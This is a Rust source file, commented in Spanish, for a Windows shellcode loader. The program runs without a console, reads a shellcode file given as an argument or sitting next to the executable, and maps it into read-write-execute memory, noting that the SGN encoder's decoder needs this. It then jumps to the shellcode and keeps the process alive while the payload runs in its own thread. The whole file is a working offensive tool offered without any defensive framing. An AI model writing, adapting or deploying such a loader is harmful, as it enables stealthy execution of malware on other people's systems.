// #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![windows_subsystem = "windows"]

use std::env;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::ptr;

use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, VirtualProtect, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
    PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
};

const SHELLCODE_NAME: &str = "shellcode.bin";
const LOG_NAME: &str = "loader.log";

/// Escribe un log junto al ejecutable (con windows subsystem no hay consola).
fn log(msg: &str) {
    if let Ok(exe) = env::current_exe() {
        if let Some(dir) = exe.parent() {
            if let Ok(mut f) = fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(dir.join(LOG_NAME))
            {
                let _ = f.write_all(msg.as_bytes());
            }
        }
    }
}

/// Resuelve la ruta del shellcode: 1er argumento, o `shellcode.bin` junto al exe.
fn shellcode_path() -> PathBuf {
    if let Some(arg) = env::args().nth(1) {
        return PathBuf::from(arg);
    }
    if let Ok(exe) = env::current_exe() {
        if let Some(dir) = exe.parent() {
            return dir.join(SHELLCODE_NAME);
        }
    }
    PathBuf::from(SHELLCODE_NAME)
}

/// Carga un .bin con shellcode en memoria y lo ejecuta.
pub fn exec_mem(file_path: &Path) -> Result<(), String> {
    let code = fs::read(file_path)
        .map_err(|e| format!("Error al abrir '{}': {}", file_path.display(), e))?;

    if code.is_empty() {
        return Err("El archivo binario está vacío.".to_string());
    }

    unsafe {
        let addr = VirtualAlloc(
            ptr::null_mut(),
            code.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            return Err(format!(
                "VirtualAlloc falló: {}",
                std::io::Error::last_os_error()
            ));
        }

        ptr::copy_nonoverlapping(code.as_ptr(), addr as *mut u8, code.len());

        // READWRITE (no READ): el decoder de SGN escribe sobre el propio buffer.
        let mut old_protect: u32 = 0;
        if VirtualProtect(addr, code.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
            VirtualFree(addr, 0, MEM_RELEASE);
            return Err(format!(
                "VirtualProtect falló: {}",
                std::io::Error::last_os_error()
            ));
        }

        let func: extern "system" fn() = std::mem::transmute(addr);
        func();

        // OJO: no liberamos. El shellcode puede haber spawneado un hilo
        // y seguir ejecutándose después de que func() retorne.
    }

    Ok(())
}

fn main() {
    let path = shellcode_path();

    match exec_mem(&path) {
        Ok(()) => {
            // func() retornó -> el shellcode vive en otro hilo. Mantenemos el proceso.
            log("[OK] shellcode lanzado; proceso mantenido vivo.\n");
            loop {
                std::thread::park();
            }
        }
        Err(e) => {
            log(&format!("[ERROR] {}\n", e));
            // Sin consola: si querés que quede vivo igual, descomentá:
            // loop { std::thread::park(); }
        }
    }
}
